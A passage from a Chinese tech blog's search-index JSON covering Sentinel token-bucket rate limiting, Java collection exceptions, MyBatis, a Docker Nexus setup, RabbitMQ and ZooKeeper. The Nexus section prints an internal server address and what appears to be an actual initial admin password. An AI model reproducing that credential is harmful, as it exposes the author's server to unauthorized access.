getParameterMetric(resourceWrapper); // 根据 rule 从 metric 中获取当前 rule 的计数器 CacheMap&lt;Object, AtomicLong&gt; tokenCounters = metric == null ? null : metric.getRuleTokenCounter(rule); CacheMap&lt;Object, AtomicLong&gt; timeCounters = metric == null ? null : metric.getRuleTimeCounter(rule); if (tokenCounters == null || timeCounters == null) &#123; return true; &#125; // Calculate max token count (threshold) Set&lt;Object&gt; exclusionItems = rule.getParsedHotItems().keySet(); long tokenCount = (long)rule.getCount(); // 如果热点参数中包含当前 value，则使用热点参数配置的count，否则使用 rule 中定义的 count if (exclusionItems.contains(value)) &#123; tokenCount = rule.getParsedHotItems().get(value); &#125; if (tokenCount == 0) &#123; return false; &#125; long maxCount = tokenCount + rule.getBurstCount(); // 当前申请的流量 和 最大流量比较 if (acquireCount &gt; maxCount) &#123; return false; &#125; while (true) &#123; long currentTime = TimeUtil.currentTimeMillis(); // 这里相当于对当前 value 对应的令牌桶进行初始化 AtomicLong lastAddTokenTime = timeCounters.putIfAbsent(value, new AtomicLong(currentTime)); if (lastAddTokenTime == null) &#123; // Token never added, just replenish the tokens and consume &#123;@code acquireCount&#125; immediately. tokenCounters.putIfAbsent(value, new AtomicLong(maxCount - acquireCount)); return true; &#125; // Calculate the time duration since last token was added. long passTime = currentTime - lastAddTokenTime.get(); // A simplified token bucket algorithm that will replenish the tokens only when statistic window has passed. if (passTime &gt; rule.getDurationInSec() * 1000) &#123; // 补充 token AtomicLong oldQps = tokenCounters.putIfAbsent(value, new AtomicLong(maxCount - acquireCount)); if (oldQps == null) &#123; // Might not be accurate here. lastAddTokenTime.set(currentTime); return true; &#125; else &#123; long restQps = oldQps.get(); // 每毫秒应该生成的 token = tokenCount / (rule.getDurationInSec() * 1000) // 再 * passTime 即等于应该补充的 token long toAddCount = (passTime * tokenCount) / (rule.getDurationInSec() * 1000); // 补充的 token 不会超过最大值 long newQps = toAddCount + restQps &gt; maxCount ? (maxCount - acquireCount) : (restQps + toAddCount - acquireCount); if (newQps &lt; 0) &#123; return false; &#125; if (oldQps.compareAndSet(restQps, newQps)) &#123; lastAddTokenTime.set(currentTime); return true; &#125; Thread.yield(); &#125; &#125; else &#123; // 直接操作计数器扣减即可 AtomicLong oldQps = tokenCounters.get(value); if (oldQps != null) &#123; long oldQpsValue = oldQps.get(); if (oldQpsValue - acquireCount &gt;= 0) &#123; if (oldQps.compareAndSet(oldQpsValue, oldQpsValue - acquireCount)) &#123; return true; &#125; &#125; else &#123; return false; &#125; &#125; Thread.yield(); &#125; &#125;&#125; 令牌桶算法核心思想如下图所示，结合这个图咱们再来理解理解代码核心逻辑在 while 循环中，咱们直接挑干的讲先回顾一下上面说过 tokenCounters 和 timeCounters，在默认限流实现中，这两个参数分别代表最后添加令牌时间，令牌剩余数量while 逻辑： 首先如果当前 value 对应的令牌桶为空，则执行初始化 计算当前时间到上次添加 token 时间经历了多久，即 passTime = currentTime - lastAddTokenTime.get() 用于判断是否需要添加token2.1) if (pass &gt; rule 中设定的限流单位时间) ，则使用原子操作为令牌桶补充 token（具体补充 token 的逻辑详见上面代码注释）2.2) else 不需要补充 token，使用原子操作扣减令牌 可以看到关于 token 的操作全是使用原子操作（CAS），保证了线程安全。如果原子操作更新失败，则会继续执行。 速率限制的实现再顺便叨咕下上面说过CONTROL_BEHAVIOR_RATE_LIMITER 速率限制策略是如何实现的，只简单说说思路，具体细节大家可以自己看下源码该策略中，仅使用 timeCounters，该参数存储的数据变成了 lastPassTime（最后通过时间），所以这个实现和令牌桶也没啥关系了新的请求到来时，首先根据 Rule 中定义时间范围，count 计算 costTime，代表每隔多久才能通过一个请求long costTime = Math.round(1.0 * 1000 * acquireCount * rule.getDurationInSec() / tokenCount);只有 lastPassTime + costTime &lt;= currentTime ，请求才有可能成功通过，lastPassTime + costTime 过大会导致限流。 参考：https://zhuanlan.zhihu.com/p/394124184","categories":[{"name":"sentinel","slug":"sentinel","permalink":"https://wuhaocn.github.io/categories/sentinel/"}],"tags":[{"name":"sentinel","slug":"sentinel","permalink":"https://wuhaocn.github.io/tags/sentinel/"}]},{"title":"","slug":"language/java/java集合类/常见异常","date":"2023-11-15T03:40:25.012Z","updated":"2023-11-15T03:40:25.012Z","comments":true,"path":"2023/11/15/language/java/java集合类/常见异常/","link":"","permalink":"https://wuhaocn.github.io/2023/11/15/language/java/java%E9%9B%86%E5%90%88%E7%B1%BB/%E5%B8%B8%E8%A7%81%E5%BC%82%E5%B8%B8/","excerpt":"","text":"ConcurrentModificationException 定义 ConcurrentModificationException 是 Java 集合框架中的一个异常类，它表示在迭代过程中，同时修改了集合。 这种异常通常在多线程环境下出现，因为在一个线程迭代集合的同时，另一个线程在修改集合。这种情况下， Java 会抛出 ConcurrentModificationException 异常，以防止数据不一致。 解决 如果需要避免这种异常，可以使用以下方法： 使用同步集合，例如 Collections.synchronizedList。 使用锁机制，例如 ReentrantLock。 在迭代过程中使用副本，例如 ArrayList 的副本。 使用迭代器的 remove 方法进行删除操作，而不是直接删除集合中的元素。","categories":[],"tags":[]},{"title":"MyBatis简介","slug":"framework/mybatis/MyBatis简介","date":"2023-11-15T03:40:25.010Z","updated":"2023-11-15T03:40:25.010Z","comments":true,"path":"2023/11/15/framework/mybatis/MyBatis简介/","link":"","permalink":"https://wuhaocn.github.io/2023/11/15/framework/mybatis/MyBatis%E7%AE%80%E4%BB%8B/","excerpt":"","text":"一、什么是MyBatisMybatis是一个优秀的ORM框架.应用在持久层. 它对jdbc的 操作数据库过程 进行封装，使开发者只需要关注 SQL 本身，而不需要花费精力去处理例如注册驱动、创建connection、等jdbc繁杂的过程代码。 二、Mybatis执行流程1、创建 SqlSessionFactory2、通过 SqlSessionFactory 创建 SqlSession3、通过 sqlsession 执行数据库操作4、调用 session.commit()提交事务5、调用 session.close()关闭会话 三、Mybatis中#和$的区别#{}是预编译处理，相当于对数据加上 双引号${}是字符串替换，相当于直接显示数据#方式能够很大程度防止 sql 注入$方式无法防止 Sql 注入$方式一般用于传入数据库对象，例如传入表名一般能用#的就别用$ 四、使用 MyBatis 的 mapper 接口调用时有哪些要求？Mapper 接口方法名和 mapper.xml 中定义的每个 sql 的 id 相同Mapper 接口方法的输入参数类型和 mapper.xml 中定义的每个 sql 的 parameterType 的类型相同Mapper 接口方法的输出参数类型和 mapper.xml 中定义的每个 sql 的 resultType 的类型相同Mapper.xml 文件中的 namespace 即是 mapper 接口的类路径 五、JDBC 编程有哪些不足之处，MyBatis 是如何解决这些问题的？ 数据库链接创建、释放频繁造成系统资源浪费从而影响系统性能，如果使用数据库链接池可解决此问题。解决：在 SqlMapConfig.xml 中配置数据链接池，使用连接池管理数据库链接。 Sql 语句写在代码中造成代码不易维护，实际应用 sql 变化的可能较大，sql 变动需要改变 java 代码。 解决：将 Sql 语句配置在 XXXXmapper.xml 文件中与 java 代码分离。 向 sql 语句传参数麻烦，因为 sql 语句的 where 条件不一定，可能多也可能少，占位符需要和参数一一对应。 解决： Mybatis 自动将 java 对象映射至 sql 语句。 对结果集解析麻烦，sql 变化导致解析代码变化，且解析前需要遍历，如果能将数据库记录封装成 pojo 对象解析比较方便。 解决：Mybatis 自动将 sql 执行结果映射至 java 对象。 六、MyBatis 在 insert 插入操作时返回主键 ID 1、数据库为 MySql 时： 123456&lt;insert id=&quot;insert&quot; parameterType=&quot;com.test.User&quot; keyProperty=&quot;userId&quot; useGeneratedKeys=&quot;true&quot; &gt;注：“keyProperty”表示返回的 id 要保存到对象的那个属性中；“useGeneratedKeys”表示主键 id 为自增长模式。MySQL 中做以上配置就 OK 了 2、数据库为 Oracle时： 12345678910&lt;insert id=&quot;insert&quot; parameterType=&quot;com.test.User&quot;&gt; &lt;selectKey resultType=&quot;INTEGER&quot; order=&quot;BEFORE&quot; keyProperty=&quot;userId&quot;&gt; SELECT SEQ_USER.NEXTVAL as userId from DUAL &lt;/selectKey&gt; insert into user (user_id, user_name, modified, state) values (#&#123;userId,jdbcType=INTEGER&#125;, #&#123;userName,jdbcType=VARCHAR&#125;,#&#123;modified,jdbcType=TIMESTAMP&#125;, #&#123;state,jdbcType=INTEGER&#125;)&lt;/insert&gt; 注： 由于 Oracle 没有自增长一说法，只有序列这种模仿自增的形式，所以不能再使用“useGeneratedKeys”属性。而是使用将 ID 获取并赋值到对象的属性中，insert 插入操作时正常插入 id。 七、Mybatis 中的一级缓存与二级缓存？ 一级缓存:基于 PerpetualCache 的 HashMap 本地缓存，其存储作用域为 Session，当 Session flush 或close 之后，该 Session 中的所有 Cache 就将清空。 二级缓存二级缓存与一级缓存其机制相同，默认也是采用 PerpetualCache，HashMap 存储，不同在于其存储作用域为Mapper(Namespace)，并且可自定义存储源，如 Ehcache。作用域为 namespance 是指对该 namespance 对应的配置文件中所有的 select 操作结果都缓存，这样不同线程之间就可以共用二级缓存。启动二级缓存：在 mapper 配置文件中：&lt; cache /&gt;二级缓存可以设置返回的缓存对象策略：。当 readOnly=”true”时，表示二级缓存返回给所有调用者同一个缓存对象实例，调用者可以 update 获取的缓存实例，但是这样可能会造成其他调用者出现数据不一致的情况（因为所有调用者调用的是同一个实例）。当 readOnly=”false”时，返回给调用者的是二级缓存总缓存对象的拷贝，即不同调用者获取的是缓存对象不同的实例，这样调用者对各自的缓存对象的修改不会影响到其他的调用者，即是安全的，所以默认是 readOnly=“false”;对于缓存数据更新机制，当某一个作用域(一级缓存 Session/二级缓存 Namespaces)的进行了 C/U/D 操作后，默认该作用域下所有 select 中的缓存将被 clear 八、Hibernate 和 Mybatis 有哪些不同？ 1）Mybatis 和 hibernate 不同，它不完全是一个 ORM 框架，因为 MyBatis 需要程序员自己编写 Sql 语句，不过 mybatis 可以通过 XML 或注解方式灵活配置要运行的 sql 语句，并将java 对象和 sql 语句映射生成最终执行的 sql，最后将 sql 执行的结果再映射生成 java 对象。 2）Mybatis 学习门槛低，简单易学，程序员直接编写原生态 sql，可严格控制 sql 执行性能，灵活度高，非常适合对关系数据模型要求不高的软件开发，例如互联网软件、企业运营类软件等，因为这类软件需求变化频繁，一但需求变化要求成果输出迅速。但是灵活的前提是 mybatis 无法做到数据库无关性，如果需要实现支持多种数据库的软件则需要自定义多套 sql 映射文件，工作量大。 3）Hibernate 对象/关系映射能力强，数据库无关性好，对于关系模型要求高的软件（例如需求固定的定制化软件）如果用 hibernate 开发可以节省很多代码，提高效率。但是Hibernate 的缺点是学习门槛高，要精通门槛更高，而且怎么设计 O/R 映射，在性能和对象模型之间如何权衡，以及怎样用好 Hibernate 需要具有很强的经验和能力才行。","categories":[{"name":"MyBatis","slug":"MyBatis","permalink":"https://wuhaocn.github.io/categories/MyBatis/"}],"tags":[{"name":"MyBatis","slug":"MyBatis","permalink":"https://wuhaocn.github.io/tags/MyBatis/"}]},{"title":"docker-nexus服务搭建","slug":"devops/docker/运行环境搭建-nexus","date":"2023-11-15T03:40:25.009Z","updated":"2023-11-15T03:40:25.010Z","comments":true,"path":"2023/11/15/devops/docker/运行环境搭建-nexus/","link":"","permalink":"https://wuhaocn.github.io/2023/11/15/devops/docker/%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-nexus/","excerpt":"","text":"nexus安装123456rm -rf /home/wuhao/nexusmkdir /home/wuhao/nexusdocker stop nexusdocker rm nexusdocker run -d --name nexus -p 5260:8081 -p 5261:8082 -p 5262:8083 -p 5263:8084 -p 5264:5000 -v /home/wuhao/nexus:/var/nexus-data sonatype/nexus3docker logs -f nexus 配置1234567891011121314http://10.10.208.193:5260/bash-4.0$ cd /nexus-data/bash-4.0$ lsadmin.password blobs cache db elasticsearch etc generated-bundles instances javaprefs kar keystores lock log orient port restore-from-backup tmpbash-4.0$ cat admin.password51a030af-f7ab-43d5-875e-3c2775dbae2c登录进去修改密码~~注意修改密码之后，提示是否开启anonymous模式，这个要勾选，否则public需要密码访问","categories":[{"name":"devops","slug":"devops","permalink":"https://wuhaocn.github.io/categories/devops/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://wuhaocn.github.io/tags/docker/"},{"name":"nexus","slug":"nexus","permalink":"https://wuhaocn.github.io/tags/nexus/"}]},{"title":"rabbitmq简介","slug":"data/rabbmitmq/rabbitmq简介","date":"2023-11-15T03:40:25.007Z","updated":"2023-11-15T03:40:25.007Z","comments":true,"path":"2023/11/15/data/rabbmitmq/rabbitmq简介/","link":"","permalink":"https://wuhaocn.github.io/2023/11/15/data/rabbmitmq/rabbitmq%E7%AE%80%E4%BB%8B/","excerpt":"","text":"1、什么是 rabbitmq采用 AMQP 高级消息队列协议的一种消息队列技术,最大的特点就是消费并不需要确保提供方存在,实现了服务之间的高度解耦 2、为什么要使用 rabbitmq（1）在分布式系统下具备异步,削峰,负载均衡等一系列高级功能;（2）拥有持久化的机制，进程消息，队列中的信息也可以保存下来。（3）实现消费者和生产者之间的解耦。（4）对于高并发场景下，利用消息队列可以使得同步访问变为串行访问达到一定量的限流，利于数据库的操作。（5）可以使用消息队列达到异步下单的效果，排队中，后台进行逻辑下单。 3、使用 rabbitmq 的场景（1）服务间异步通信（2）顺序消费（3）定时任务（4）请求削峰 4、如何确保消息正确地发送至 RabbitMQ？ 如何确保消息接收方消费了消息？发送方确认模式将信道设置成 confirm 模式（发送方确认模式），则所有在信道上发布的消息都会被指派一个唯一的 ID。一旦消息被投递到目的队列后，或者消息被写入磁盘后（可持久化的消息），信道会发送一个确认给生产者（包含消息唯一 ID）。如果 RabbitMQ 发生内部错误从而导致消息丢失，会发送一条 nack（notacknowledged，未确认）消息。发送方确认模式是异步的，生产者应用程序在等待确认的同时，可以继续发送消息。当确认消息到达生产者应用程序，生产者应用程序的回调方法就会被触发来处理确认消息。 接收方确认机制消费者接收每一条消息后都必须进行确认（消息接收和消息确认是两个不同操作）。只有消费者确认了消息，RabbitMQ 才能安全地把消息从队列中删除。这里并没有用到超时机制，RabbitMQ 仅通过 Consumer 的连接中断来确认是否需要重新发送消息。也就是说，只要连接不中断，RabbitMQ 给了 Consumer 足够长的时间来处理消息。保证数据的最终一致性；下面罗列几种特殊情况（1）如果消费者接收到消息，在确认之前断开了连接或取消订阅，RabbitMQ 会认为消息没有被分发，然后重新分发给下一个订阅的消费者。（可能存在消息重复消费的隐患，需要去重）（1）2如果消费者接收到消息却没有确认消息，连接也未断开，则 RabbitMQ 认为该消费者繁忙，将不会给该消费者分发更多的消息。 5.如何避免消息重复投递或重复消费？在消息生产时，MQ 内部针对每条生产者发送的消息生成一个 inner-msg-id，作为去重的依据（消息投递失败并重传），避免重复的消息进入队列；在消息消费时，要求消息体中必须要有一个 bizId（对于同一业务全局唯一，如支付 ID、订单 ID、帖子 ID 等）作为去重的依据，避免同一条消息被重复消费。 6、消息基于什么传输？由于 TCP 连接的创建和销毁开销较大，且并发数受系统资源限制，会造成性能瓶颈。RabbitMQ 使用信道的方式来传输数据。信道是建立在真实的 TCP 连接内的虚拟连接，且每条 TCP 连接上的信道数量没有限制。 7、消息如何分发？若该队列至少有一个消费者订阅，消息将以循环（round-robin）的方式发送给消费者。每条消息只会分发给一个订阅的消费者（前提是消费者能够正常处理消息并进行确认）。通过路由可实现多消费的功能 8、消息怎么路由？消息提供方-&gt;路由-&gt;一至多个队列消息发布到交换器时，消息将拥有一个路由键（routing key），在消息创建时设定。通过队列路由键，可以把队列绑定到交换器上。消息到达交换器后，RabbitMQ 会将消息的路由键与队列的路由键进行匹配（针对不同的交换器有不同的路由规则）；常用的交换器主要分为一下三种：fanout：如果交换器收到消息，将会广播到所有绑定的队列上direct：如果路由键完全匹配，消息就被投递到相应的队列topic：可以使来自不同源头的消息能够到达同一个队列。 使用 topic 交换器时，可以使用通配符 9、如何确保消息不丢失？消息持久化，当然前提是队列必须持久化RabbitMQ 确保持久性消息能从服务器重启中恢复的方式是，将它们写入磁盘上的一个持久化日志文件，当发布一条持久性消息到持久交换器上时，Rabbit 会在消息提交到日志文件后才发送响应。一旦消费者从持久队列中消费了一条持久化消息，RabbitMQ 会在持久化日志中把这条消息标记为等待垃圾收集。如果持久化消息在被消费之前 RabbitMQ 重启，那么 Rabbit 会自动重建交换器和队列（以及绑定），并重新发布持久化日志文件中的消息到合适的队列。 10、使用 RabbitMQ 有什么好处？（1）服务间高度解耦（2）异步通信性能高（3）流量削峰 11、RabbitMQ 的集群镜像集群模式你创建的 queue，无论元数据还是 queue 里的消息都会存在于多个实例上，然后每次你写消息到 queue 的时候，都会自动把消息到多个实例的 queue 里进行消息同步。好处在于，你任何一个机器宕机了，没事儿，别的机器都可以用。坏处在于，第一，这个性能开销也太大了吧，消息同步所有机器，导致网络带宽压力和消耗很重！第二，这么玩儿，就没有扩展性可言了，如果某个 queue 负载很重，你加机器，新增的机器也包含了这个 queue 的所有数据，并没有办法线性扩展你的 queue 12、mq 的缺点（1）系统可用性降低系统引入的外部依赖越多，越容易挂掉，本来你就是 A 系统调用 BCD 三个系统的接口就好了，人 ABCD 四个系统好好的，没啥问题，你偏加个 MQ 进来，万一MQ 挂了咋整？MQ 挂了，整套系统崩溃了，你不就完了么。 （2）系统复杂性提高硬生生加个 MQ 进来，你怎么保证消息没有重复消费？怎么处理消息丢失的情况？怎么保证消息传递的顺序性？头大头大，问题一大堆，痛苦不已 （3）一致性问题A 系统处理完了直接返回成功了，人都以为你这个请求就成功了；但是问题是，要是 BCD 三个系统那里，BD 两个系统写库成功了，结果 C 系统写库失败了，咋整？你这数据就不一致了。所以消息队列实际是一种非常复杂的架构，你引入它有很多好处，但是也得针对它带来的坏处做各种额外的技术方案和架构来规避掉，最好之后，你会发现，妈呀，系统复杂度提升了一个数量级，也许是复杂了 10 倍。但是关键时刻，用，还是得用的。","categories":[{"name":"mq","slug":"mq","permalink":"https://wuhaocn.github.io/categories/mq/"}],"tags":[{"name":"mq","slug":"mq","permalink":"https://wuhaocn.github.io/tags/mq/"}]},{"title":"zookeeper简介","slug":"data/zookeeper/zookeeper简介","date":"2023-11-15T03:40:25.007Z","updated":"2023-11-15T03:40:25.008Z","comments":true,"path":"2023/11/15/data/zookeeper/zookeeper简介/","link":"","permalink":"https://wuhaocn.github.io/2023/11/15/data/zookeeper/zookeeper%E7%AE%80%E4%BB%8B/","excerpt":"","text":"前言ZooKeeper 是一个分布式的，开放源码的分布式应用程序协调服务。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。ZooKeeper 的目标就是封装好复杂易出错的关键服务，将简单易用的接口和性能高效、功能稳定的系统提供给用户。 常见知识点1. ZooKeeper 是什么？ZooKeeper 是一个开放源码的分布式协调服务，它是集群的管理者，监视着集群中各个节点的状态根据节点提交的反馈进行下一步合理操作。最终，将简单易用的接口和性能高效、功能稳定的系统提供给用户。分布式应用程序可以基于 Zookeeper 实现诸如数据发布/订阅、负载均衡、命名服务、分布式协调/通知、集群管理、Master选举、分布式锁和分布式队列等功能。Zookeeper 保证了如下分布式一致性特性：（1）顺序一致性（2）原子性（3）单一视图（4）可靠性（5）实时性（最终一致性）客户端的读请求可以被集群中的任意一台机器处理，如果读请求在节点上注册了监听器，这个监听器也是由所连接的 zookeeper机器来处理。对于写请求，这些请求会同时发给其他 zookeeper 机器并且达成一致后，请求才会返回成功。因此，随着 zookeeper的集群机器增多，读请求的吞吐会提高但是写请求的吞吐会下降。有序性是 zookeeper 中非常重要的一个特性，所有的更新都是全局有序的，每个更新都有一个唯一的时间戳，这个时间戳称为zxid（Zookeeper Transaction Id）。而读请求只会相对于更新有序，也就是读请求的返回结果中会带有这个zookeeper 最新的 zxid。 2. ZooKeeper 提供了什么？（1）文件系统（2）通知机制 3.Zookeeper 文件系统Zookeeper 提供一个多层级的节点命名空间（节点称为 znode）。与文件系统不同的是，这些节点都可以设置关联的数据，而文件系统中只有文件节点可以存放数据而目录节点不行。Zookeeper 为了保证高吞吐和低延迟，在内存中维护了这个树状的目录结构，这种特性使得 Zookeeper 不能用于存放大量的数据，每个节点的存放数据上限为1M。 4. ZAB 协议？ZAB 协议是为分布式协调服务 Zookeeper 专门设计的一种支持崩溃恢复的原子广播协议。ZAB 协议包括两种基本的模式：崩溃恢复和消息广播。当整个 zookeeper 集群刚刚启动或者 Leader 服务器宕机、重启或者网络故障导致不存在过半的服务器与 Leader服务器保持正常通信时，所有进程（服务器）进入崩溃恢复模式，首先选举产生新的 Leader 服务器，然后集群中 Follower 服务器开始与新的Leader 服务器进行数据同步，当集群中超过半数机器与该 Leader服务器完成数据同步之后，退出恢复模式进入消息广播模式，Leader服务器开始接收客户端的事务请求生成事物提案来进行事务请求处理。 5. 四种类型的数据节点 Znode（1）PERSISTENT-持久节点除非手动删除，否则节点一直存在于 Zookeeper 上（2）EPHEMERAL-临时节点临时节点的生命周期与客户端会话绑定，一旦客户端会话失效（客户端与zookeeper 连接断开不一定会话失效），那么这个客户端创建的所有临时节点都会被移除。（3）PERSISTENT_SEQUENTIAL-持久顺序节点基本特性同持久节点，只是增加了顺序属性，节点名后边会追加一个由父节点维护的自增整型数字。（4）EPHEMERAL_SEQUENTIAL-临时顺序节点基本特性同临时节点，增加了顺序属性，节点名后边会追加一个由父节点维护的自增整型数字。 6. Zookeeper Watcher 机制 – 数据变更通知Zookeeper 允许客户端向服务端的某个 Znode 注册一个 Watcher 监听，当服务端的一些指定事件触发了这个Watcher，服务端会向指定客户端发送一个事件通知来实现分布式的通知功能，然后客户端根据 Watcher 通知状态和事件类型做出业务上的改变。工作机制：（1）客户端注册 watcher（2）服务端处理 watcher（3）客户端回调 watcherWatcher 特性总结：（1）一次性无论是服务端还是客户端，一旦一个 Watcher 被 触 发 ，Zookeeper都会将其从相应的存储中移除。这样的设计有效的减轻了服务端的压力，不然对于更新非常频繁的节点，服务端会不断的向客户端发送事件通知，无论对于网络还是服务端的压力都非常大。（2）客户端串行执行客户端 Watcher 回调的过程是一个串行同步的过程。（3）轻量3.1、Watcher 通知非常简单，只会告诉客户端发生了事件，而不会说明事件的具体内容。3.2、客户端向服务端注册 Watcher 的时候，并不会把客户端真实的 Watcher 对象实体传递到服务端，仅仅是在客户端请求中使用 boolean类型属性进行了标记。（4）watcher event 异步发送 watcher 的通知事件从 server 发送到 client 是异步的，这就存在一个问题，不同的客户端和服务器之间通过socket 进行通信，由于网络延迟或其他因素导致客户端在不通的时刻监听到事件，由于 Zookeeper 本身提供了 orderingguarantee，即客户端监听事件后，才会感知它所监视 znode发生了变化。所以我们使用 Zookeeper 不能期望能够监控到节点每次的变化。Zookeeper只能保证最终的一致性，而无法保证强一致性。（5）注册 watcher getData、exists、getChildren（6）触发 watcher create、delete、setData（7）当一个客户端连接到一个新的服务器上时，watch 将会被以任意会话事件触发。当与一个服务器失去连接的时候，是无法接收到 watch的。而当 client 重新连接时，如果需要的话，所有先前注册过的 watch，都会被重新注册。通常这是完全透明的。只有在一个特殊情况下，watch可能会丢失：对于一个未创建的 znode的 exist watch，如果在客户端断开连接期间被创建了，并且随后在客户端连接上之前又删除了，这种情况下，这个watch 事件可能会被丢失。 7. 客户端注册 Watcher 实现（1）调用 getData()/getChildren()/exist()三个 API，传入 Watcher 对象（2）标记请求 request，封装 Watcher 到 WatchRegistration（3）封装成 Packet 对象，发服务端发送 request（4）收到服务端响应后，将 Watcher 注册到 ZKWatcherManager 中进行管理（5）请求返回，完成注册。 8. 服务端处理 Watcher 实现（1）服务端接收 Watcher 并存储接收到客户端请求，处理请求判断是否需要注册 Watcher，需要的话将数据节点的节点路径和 ServerCnxn（ServerCnxn代表一个客户端和服务端的连接，实现了 Watcher 的 process 接口，此时可以看成一个 Watcher 对象）存储在WatcherManager 的WatchTable 和 watch2Paths 中去。（2）Watcher 触发以服务端接收到 setData() 事务请求触发 NodeDataChanged 事件为例：2.1 封装 WatchedEvent将通知状态（SyncConnected）、事件类型（NodeDataChanged）以及节点路径封装成一个 WatchedEvent 对象2.2 查询 Watcher从 WatchTable 中根据节点路径查找 Watcher2.3 没找到；说明没有客户端在该数据节点上注册过 Watcher2.4 找到；提取并从 WatchTable 和 Watch2Paths 中删除对应 Watcher（从这里可以看出 Watcher 在服务端是一次性的，触发一次就失效了）（3）调用 process 方法来触发 Watcher这里 process 主要就是通过 ServerCnxn 对应的 TCP 连接发送 Watcher 事件通知。 9. 客户端回调 Watcher客户端 SendThread 线程接收事件通知，交由 EventThread 线程回调 Watcher。客户端的 Watcher 机制同样是一次性的，一旦被触发后，该 Watcher 就失效了。 10. ACL 权限控制机制UGO（User/Group/Others）目前在 Linux/Unix 文件系统中使用，也是使用最广泛的权限控制方式。是一种粗粒度的文件系统权限控制模式。ACL（Access Control List）访问控制列表包括三个方面：权限模式（Scheme）（1）IP：从 IP 地址粒度进行权限控制（2）Digest：最常用，用类似于 username:password 的权限标识来进行权限配置，便于区分不同应用来进行权限控制（3）World：最开放的权限控制方式，是一种特殊的 digest 模式，只有一个权限标识“world:anyone”（4）Super：超级用户授权对象授权对象指的是权限赋予的用户或一个指定实体，例如 IP 地址或是机器灯。权限 Permission（1）CREATE：数据节点创建权限，允许授权对象在该 Znode 下创建子节点（2）DELETE：子节点删除权限，允许授权对象删除该数据节点的子节点（3）READ：数据节点的读取权限，允许授权对象访问该数据节点并读取其数据内容或子节点列表等（4）WRITE：数据节点更新权限，允许授权对象对该数据节点进行更新操作（5）ADMIN：数据节点管理权限，允许授权对象对该数据节点进行 ACL 相关设置操作 11. Chroot 特性3.2.0 版本后，添加了 Chroot 特性，该特性允许每个客户端为自己设置一个命名空间。如果一个客户端设置了Chroot，那么该客户端对服务器的任何操作，都将会被限制在其自己的命名空间下。通过设置 Chroot，能够将一个客户端应用于 Zookeeper 服务端的一颗子树相对应，在那些多个应用公用一个 Zookeeper进群的场景下，对实现不同应用间的相互隔离非常有帮助。 12. 会话管理分桶策略：将类似的会话放在同一区块中进行管理，以便于 Zookeeper 对会话进行不同区块的隔离处理以及同一区块的统一处理。分配原则：每个会话的“下次超时时间点”（ExpirationTime）计算公式：ExpirationTime_ = currentTime + sessionTimeoutExpirationTime = (ExpirationTime_ / ExpirationInrerval + 1) *ExpirationInterval , ExpirationInterval 是指 Zookeeper 会话超时检查时间间隔，默认 tickTime 13. 服务器角色Leader（1）事务请求的唯一调度和处理者，保证集群事务处理的顺序性（2）集群内部各服务的调度者Follower（1）处理客户端的非事务请求，转发事务请求给 Leader 服务器（2）参与事务请求 Proposal 的投票（3）参与 Leader 选举投票Observer（1）3.0 版本以后引入的一个服务器角色，在不影响集群事务处理能力的基础上提升集群的非事务处理能力（2）处理客户端的非事务请求，转发事务请求给 Leader 服务器（3）不参与任何形式的投票 14. Zookeeper 下 Server 工作状态服务器具有四种状态，分别是 LOOKING、FOLLOWING、LEADING、OBSERVING。（1）LOOKING：寻 找 Leader 状态。当服务器处于该状态时，它会认为当前集群中没有 Leader，因此需要进入 Leader 选举状态。（2）FOLLOWING：跟随者状态。表明当前服务器角色是 Follower。（3）LEADING：领导者状态。表明当前服务器角色是 Leader。（4）OBSERVING：观察者状态。表明当前服务器角色是 Observer。 15. 数据同步整个集群完成 Leader 选举之后，Learner（Follower 和 Observer 的统称）回向Leader 服务器进行注册。当 Learner 服务器想 Leader服务器完成注册后，进入数据同步环节。数据同步流程：（均以消息传递的方式进行）Learner 向 Learder 注册数据同步同步确认Zookeeper 的数据同步通常分为四类：（1）直接差异化同步（DIFF 同步）（2）先回滚再差异化同步（TRUNC+DIFF 同步）（3）仅回滚同步（TRUNC 同步）（4）全量同步（SNAP 同步）在进行数据同步前，Leader 服务器会完成数据同步初始化：peerLastZxid：· 从 learner 服务器注册时发送的 ACKEPOCH 消息中提取 lastZxid（该Learner 服务器最后处理的 ZXID）minCommittedLog：· Leader 服务器 Proposal 缓存队列 committedLog 中最小 ZXIDmaxCommittedLog：· Leader 服务器 Proposal 缓存队列 committedLog 中最大 ZXID直接差异化同步（DIFF 同步）· 场景：peerLastZxid 介于 minCommittedLog 和 maxCommittedLog之间先回滚再差异化同步（TRUNC+DIFF 同步）· 场景：当新的 Leader 服务器发现某个 Learner 服务器包含了一条自己没有的事务记录，那么就需要让该 Learner 服务器进行事务回滚–回滚到Leader服务器上存在的，同时也是最接近于 peerLastZxid 的 ZXID仅回滚同步（TRUNC 同步）· 场景：peerLastZxid 大于 maxCommittedLog全量同步（SNAP 同步）· 场景一：peerLastZxid 小于 minCommittedLog· 场景二：Leader 服务器上没有 Proposal 缓存队列且 peerLastZxid 不等于 lastProcessZxid 16. zookeeper 是如何保证事务的顺序一致性的？zookeeper 采用了全局递增的事务 Id 来标识，所有的 proposal（提议）都在被提出的时候加上了 zxid，zxid 实际上是一个 64 位的数字，高32 位是 epoch（ 时期; 纪元; 世; 新时代）用来标识 leader 周期，如果有新的 leader 产生出来，epoch会自增，低 32 位用来递增计数。当新产生proposal 的时候，会依据数据库的两阶段过程，首先会向其他的 server 发出事务执行请求，如果超过半数的机器都能执行并且能够成功，那么就会开始执行。 17. 分布式集群中为什么会有 Master？在分布式环境中，有些业务逻辑只需要集群中的某一台机器进行执行，其他的机器可以共享这个结果，这样可以大大减少重复计算，提高性能，于是就需要进行leader选举。 18. zk 节点宕机如何处理？Zookeeper 本身也是集群，推荐配置不少于 3 个服务器。Zookeeper 自身也要保证当一个节点宕机时，其他节点会继续提供服务。如果是一个 Follower 宕机，还有 2 台服务器提供访问，因为 Zookeeper 上的数据是有多个副本的，数据并不会丢失；如果是一个 Leader 宕机，Zookeeper 会选举出新的 Leader。ZK 集群的机制是只要超过半数的节点正常，集群就能正常提供服务。只有在 ZK节点挂得太多，只剩一半或不到一半节点能工作，集群才失效。所以3 个节点的 cluster 可以挂掉 1 个节点(leader 可以得到 2 票&gt;1.5)2 个节点的 cluster 就不能挂掉任何 1 个节点了(leader 可以得到 1 票&lt;=1) 19. zookeeper 